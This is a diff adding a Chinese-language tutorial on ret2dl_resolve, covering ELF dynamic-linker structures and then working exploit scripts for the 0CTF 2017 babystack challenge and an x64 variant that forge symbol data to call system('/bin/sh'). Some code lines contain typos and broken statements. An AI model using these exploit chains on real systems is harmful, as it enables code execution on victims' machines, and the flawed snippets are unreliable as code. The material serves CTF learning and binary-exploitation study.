@@ -1,0 +1,175 @@
+### ret2dl_resolve原理与实践
+#### 原理
+  * ##### ELF对象
+    * ELF文件是很多类unix系统（Lniux、FreeBSD）的可执行文件格式。
+    * 一个应用程序主要由ELF和动态链接库.so组成。在ELF文件中有多个segment，每个segment包括多个sections。
+    * 后面主要涉及.dynsym，.rela.plt和.dynstr，rel.plt。
+  * ##### ELF动态装载器
+    * 由于静态链接的文件比较大，且多是重复使用的代码。且一次装载耗时较多；所以才有了惰性加载（运行时加载）。
+    * ELF文件执行时根据section里的信息，动态地链接.so文件中的资源（函数、变量）。这一过程（符号解析）由动态装载器实现。
+    * 解析主要依赖于_dl_runtime_resolve函数。解析规则如图。
+    * 相关的数据结构
+      * 每个符号都是ELF_sym结构体。存在于.dynsym段。
+        * st_name字段保存着该符号在,synstr段的偏移（那里保存着符号的字符串形式）
+        * st_value字段，如果该符号已经被解析过，则保存着它的虚拟地址；否则NULL。
+                        typedef struct
+            {
+              Elf32_Word        st_name;                /* Symbol name (string tbl index) */
+              Elf32_Addr        st_value;                /* Symbol value */
+              Elf32_Word        st_size;                /* Symbol size */
+              unsigned char        st_info;                /* Symbol type and binding */
+              unsigned char        st_other;                /* Symbol visibility */
+              Elf32_Section        st_shndx;                /* Section index */
+            } Elf32_Sym;
+      * 导入符号需要重定位支持，重定位项以ELF_Rel结构描述，存在于rel.plt段中
+        * r_offset字段：该函数在got.plt中的偏移
+        * r_info字段：该函数在dynsym中的类型和索引。
+                        typedef struct
+            {
+              Elf32_Addr        r_offset;                /* Address */
+              Elf32_Word        r_info;                  /* Relocation type and symbol index */
+            } Elf32_Rel;
+      * 解析结束后，重定位的目标（Elf_Rel的r_offset）将会是got表的一个条目，got在got.plt中，将有能够解析rel.plt重定位项的动态链接器写入。
+  * ##### 对解析read函数（第一次调用）的一次跟踪过程
+    * gdb跟踪解析 **PLT**
+  * read函数未被解析时，got['read']中存的是plt['read']的第二条指令地址，所以会继续执行解析工作。
+  * push 1操作实际是read函数符号在rel_plt的索引 **reloc_index** ；而 **0x4004d0** 地址是特殊字段 **PLT[0]**
+  * PLT[0]的代码会将 **GOT[1]** 入栈，并跳转至 **GTO[2]** 。
+GOT[1]和GOT[2]是两个特殊字段。
+        GOT[1]是内部数据结构的指针，类型是link_map，在动态装载器内部使用，包含了进行符号解析需要的当前ELF对象的信息。
+    GOT[2]是一个指向动态装载器中_dl_runtime_resolve函数的指针。
+  * 从上面的跟踪可以看出，PLT代码执行了 **_dl_runtime_resolve(link_map_obj, reloc_index)** 的调用。
+  * 图示该函数的实现作用
+  * **.dynamic段和RELRO**
+    * 动态装载器从.dynamic段收集所有它需要的关于ELF对象的信息。.dynamic段由Elf_Dyn结构组成，一个Elf_Dyn是一个键值对，其中存储了不同类型的信息。相关的条目已经在表1中展示，它们保存着特定段的绝对地址。有一个例外是DT_DEBUG条目，它保存的动态装载器内部数据结构的指针。这个条目是为了调试的需要由动态装载器初始化的。
+    * 部分RELRO：一些段(包括.dynamic)在初始化后将会被标识为只读。
+    * 全部RELRO：所有的导入符号将在开始时被解析，.got.plt段会被完全初始化为目标函数的最终地址，并被标记为只读。此外，既然惰性解析被禁用，GOT[0]与GOT[1]条目将不会被初始化为之前中提到的值。
+  * ##### 攻击
+    * 通过伪造整个解析过程所依赖的符号信息（相关的数据结构），就可以将我们需要的函数动态加载进某一地址。攻击示意图
+这里，通过改写got[1]，即link_map指向一个我们伪造得ELF_Dyn结构。在这个结构中破坏保存DT_STRTAB指针的l_info域。它的值被设成一个伪造的动态条目的地址，那里指向了一个位于.bss段中的假的动态字符串表。
+      * a攻击实例中，改写DT_STRTAB条目，欺骗解析器认为.dynstr在.bss上，且在.bss伪造的dynsyn中写入我们的函数字符串，这里调用printf会劫持到execve。
+      * b宏基实例中，通过传递给_dl_runtime_resolve函数的索引reloc_index超出范围，落在了.bss，并在那里伪造Elf_Rle结构；这个重定位项指向一个就位于其后的Elf_Sym结构，而Elf_Sym结构中的index同样超出了.dynsym段。这样这个符号就会包含一个相对.dynstr地址足够大的偏移使其能够达到这个符号之后的一段内存，那里保存着这个将要调用的函数的名称。
+#### 实践
+  * ##### x86 0Ctf 2017 babystack
+    * 无输出函数，不知道libc版本。。
+    * ret2dl_resolve方法解决
+    * 首先根据上图的流程手动模拟，找到"read"函数。
+    * 代码模拟——借助于栈迁移，将stack迁移到.bss。
+                #rop information
+        read_plt = 0x08048300 
+        bss_buf = 0x0804A020
+        leave_ret = 0x08048455
+        pop_3_ret = 0x080484e9      # pop esi ; pop edi ; pop ebp ; ret
+        pop_ebp_ret = 0x080484eb    # pop ebp ; ret
+        #stack poivt and read(0, bss, 0x1000)
+        payload = 'a'*0x28
+        payload += p32(bss_buf)     #ebp ==> bss_buf
+        payload += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_buf) + p32(0x36)
+        p.send(payload)
+        dbg()
+        stack_size = 0x800
+        control_base = bss_buf + stack_size
+        payload = 'a'*0x4                           #read(0, bss_buf = ebp, 0x1000),        while ebp+4 is ret_addr
+        payload += p32(read_plt) + p32(pop_3_ret) + p32(0) + p32(control_base) + p32(0x1000)
+        payload += p32(pop_ebp_ret) + p32(control_base)     #ebp = control_base, so ret_addr is at control_base+4 which is plt_0
+        payload += p32(leave_ret)
+        p.send(payload)
+    * 伪造相关数据结构
+                #elf information
+        rel_plt = 0x80482b0
+        jmptab = 0x80482b0
+        dynsym = 0x080481cc
+        symtab = 0x080481cc
+        dynstr = 0x0804822c
+        strtab = 0x0804822c
+        #fake information
+        alarm_got = elf.got['alarm']
+        fake_sym_addr = control_base + 0x24
+        align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
+        fake_sym_addr += align
+        index_sym = (fake_sym_addr - dynsym) / 0x10
+        r_info = index_sym system
+        st_name=fake_sym_addr+0x10-dynstr
+        fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)
+        plt_0 = 0x080482F0
+        index_offset = (control_base + 0x1c) - rel_plt                      #plt_i索引
+    * 栈布置
+      * 其中通过导向执行PLT0，这里的参数很好理解。但是被解析函数的参数的位置怎么确定呢？在执行PLT0代码是，栈上的参数分布如下
+      * 其他的结构都是伪造的布置在栈上，只要前后一致就没有问题。
+    ```python
+    payload += p32(plt_0)                                               #push link_map; jmp dl_runtime_resolve.
+    payload += p32(index_offset)                                        #push idx
+    payload += 'a'*4        
+    payload += p32(control_base + 0x50)                                 #参数地址
+    payload += 'a'*8
+    payload += fake_reloc                                               #control_base + 0x1c
+    payload += 'b'*8
+    payload += fake_sym                                                 #control_base + 0x24
+    payload += 'system\x00'
+    payload = payload.ljust(0x50, 'a')
+    payload += cmd                                                      #被解析函数的参数位置
+    payload = payload.ljust(0x64, 'a')
+    ```
+  * 可以看到还是很麻烦的，利用工具[roputils](https://github.com/inaz2/roputils)可以简化该过程。
+        rom pwn import *
+    import sys
+    sys.path.append("/home/tree/pwntools/roputils")
+    import roputils
+    import time
+    #coding:utf-8
+    offset = 0x2c
+    readplt = 0x08048300
+    bss = 0x0804a020
+    vulFunc = 0x0804843B
+    p = process('./babystack')
+    # p = remote('202.120.7.202', 6666)
+    # context.log_level = 'debug'
+    rop = roputils.ROP('./babystack')
+    addr_bss = rop.section('.bss')
+    # step1 : write sh & resolve struct to bss
+    buf1 = 'A' * offset #44
+    buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)
+    p.send(buf1)
+    buf2 =  rop.string('/bin/sh')
+    buf2 += rop.fill(20, buf2)
+    buf2 += rop.dl_resolve_data(addr_bss+20, 'system')      #address for func, and name for func
+    buf2 += rop.fill(100, buf2)
+    p.send(buf2)
+    #step2 : use dl_resolve_call get system & system('/bin/sh')
+    buf3 = 'A'*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)      #address for func and args for func
+    p.send(buf3)
+    p.interactive()
+  * ##### x64
+    * 多了两个结构体。rela.plt和Sym
+    * 同时r_offset不在直接寻址，而是作为rel.plt的索引。
+    * 同时需要link_mmap设置为0（先泄露link_mmap_addr）
+    * 利用roputils实现
+```python  
+#!/usr/bin/python  
+# - _\- coding: utf-8 -_ -  
+import sys  
+sys.path.append("/home/tree/pwntools/roputils")  
+from roputils import *
+fpath = './ret2dl64'  
+offset = 0x28  
+rop = ROP(fpath)  
+addr_bss = rop.section('.bss')
+read_plt = rop.plt('read')  
+read_got = rop.got('read')
+p = Proc(fpath)  
+payload = rop.retfill(offset)  
+payload += rop.call(read_plt, 0, addr_bss, 0x100)  
+payload += rop.dl_resolve_call(addr_bss+0x20, addr_bss) #link mmap地址，参数地址
+p.write(payload)  
+payload = rop.string("/bin/sh\x00")  
+payload += rop.fill(0x20, payload)  
+payload += rop.dl_resolve_dada(addr_bss + 0x20, 'system') #link mmap 地址, 函数名  
+payload += rop.fill(0x100, payload)
+    p.write(payload)
+    p.interact(0)
+    ```
+  * ##### 参考链接
+    * [安全客](https://www.anquanke.com/post/id/177450)
+    * [Leakless Paper](http://www.inforsec.org/wp/?p=389)
+    * [ret2dl_resolve笔记](\[https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\]\(https://veritas501.space/2017/10/07/ret2dl_resolve学习笔记/))
+    * [ichunqiu](https://bbs.ichunqiu.com/thread-44816-1-1.html)
